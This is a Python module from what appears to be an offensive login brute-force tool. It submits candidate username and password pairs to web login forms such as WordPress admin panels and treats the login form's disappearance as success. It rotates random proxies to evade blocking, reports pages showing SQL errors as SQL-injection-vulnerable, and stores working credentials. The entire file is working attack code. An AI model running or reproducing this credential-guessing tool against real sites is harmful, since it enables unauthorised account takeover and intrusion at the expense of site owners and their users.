from core.tbrowser import parseLoginForm, startBrowser, sqlerror
from core.utils import printf, die
from core.actions import randomFromList

def check_condition(options, proc, loginInfo):

	"""
		Check logged in successfully condition.
		This function will check SQL injection as well
			return 0 -> False
			return 1 -> True
			return 2 -> Should be SQL Injection error-based
	"""
	if options.panel_url:
		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
		proc.open(options.panel_url)
		if not parseLoginForm(proc.forms()):# != loginInfo:
			if sqlerror(proc.response().read()):
				return 2
			else:
				return 1
		else:
			return 0
	else:
		# User provided direct login URL (/wp-login.php).
		# DEBUG
		# proc.open(options.url)
		# if parseLoginForm(proc.forms()) != loginInfo:
		# 	return 1
		# else:
		# 	return 0
		if sqlerror(proc.response().read()):
			return 2
		else:
			return 1


def submit(options, loginInfo, tryCred, result):

	#	Get login form field informations
	
	# frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred

	proc = startBrowser(options.timeout)

	# BREAK if we had valid payload?
	# if options.options["-p"] == "sqli" and len(list(result.queue)) > 1:
	# 	return True
	
	for cred in list(result.queue):
		if tryUsername == cred[1]:
			return True
	
	if options.proxy:
		# Set proxy connect
		proxyAddr = randomFromList(options.proxy)
		proc.set_proxies({"http": proxyAddr})
	
	try:
		proc.open(options.login_url)
		_form = parseLoginForm(proc.forms())
		if not _form:
			if options.verbose:
				printf("[x] LoginBrute: No login form found. Possibly get blocked!")
			return False
		else:
			frmLoginID, frmFields = _form
		if options.verbose and loginInfo != _form:
			printf("[+] Warning: Form field has been changed!")

		#	Select login form
		proc.select_form(nr = frmLoginID)
		
		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
		
		for field, cred in zip(frmFields, tryCred):
			proc.form[field] = cred

		# page_title = proc.title()
		#	Send request

		if options.verbose:
			if options.proxy:
				printf("[+] Trying: %s through %s" %([tryUsername, tryPassword],proxyAddr), 'norm')
			else:
				printf("[+] Trying: %s" %([tryUsername, tryPassword]), 'norm')
		
		#	Reload the browser. For javascript redirection and others...
		# proc.reload()
		#	If no login form -> maybe success. Check conditions
		
		proc.submit()
		if not parseLoginForm(proc.forms()):# != loginInfo:
			test_result = check_condition(options, proc, loginInfo)
			
			if test_result == 1:
				#printf("[*] Page title: ['%s']" %(proc.title()), "good")
				# "If we tried login form with username+password field"
				if tryUsername:
					printf("[*] %s [%s]" %([tryUsername, tryPassword], proc.title()), "good")
				# "Else If we tried login form with password field only"
				else:
					printf("[*] %s []" %([tryPassword], proc.title()), "good")
				result.put([options.url, tryUsername, tryPassword])
			elif test_result == 2 and options.verbose:
				printf("[+] SQL Injection vulnerable found")
				printf("   %s" %([tryUsername, tryPassword]), "norm")
			else:
				# Possibly Error. But sometime it is true
				if options.verbose:
					printf("[x] Get error page: %s" %([tryUsername, tryPassword]), "bad")
					printf("   [x] Page title: ['%s']" %(proc.title()), "bad")
		
		# "Login form is still there. Oops"
		else:
			# TODO test if web has similar text (static)
			if sqlerror(proc.response().read()) and options.verbose:
				printf("[+] SQL Injection vulnerable found")
				printf("   %s" %([tryUsername, tryPassword]), "norm")
			if options.verbose:
				if options.proxy:
					printf(
						"[-] Failed: %s through %s" %([tryUsername, tryPassword], proxyAddr),
						"bad"
					)
				else:
					printf(
						"[-] Failed: %s" %([tryUsername, tryPassword]),
						"bad"
					)
		return True

	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""		

		try:
			# Unauthenticated
			if error.code == 401:
				if options.verbose:
					printf("[-] Failed: %s" %([tryUsername, tryPassword]), "bad")
			# Server misconfiguration? Panel URL is deleted or wrong
			elif error.code == 404:
				printf("[x] %s: %s" %(error, tryCred[::-1]), "bad")
				if options.verbose:
					printf("   %s" %(proc.geturl()), "bad")
			# Other error code
			else:
				if options.verbose:
					printf("[x] (%s): %s" %(proc.geturl(), tryCred[::-1]), "bad")
		except:
			# THIS BLOCKED BY WAF
			printf("[x] Loginbrute: %s" %(error), "bad")
		return False

	finally:
		proc.close()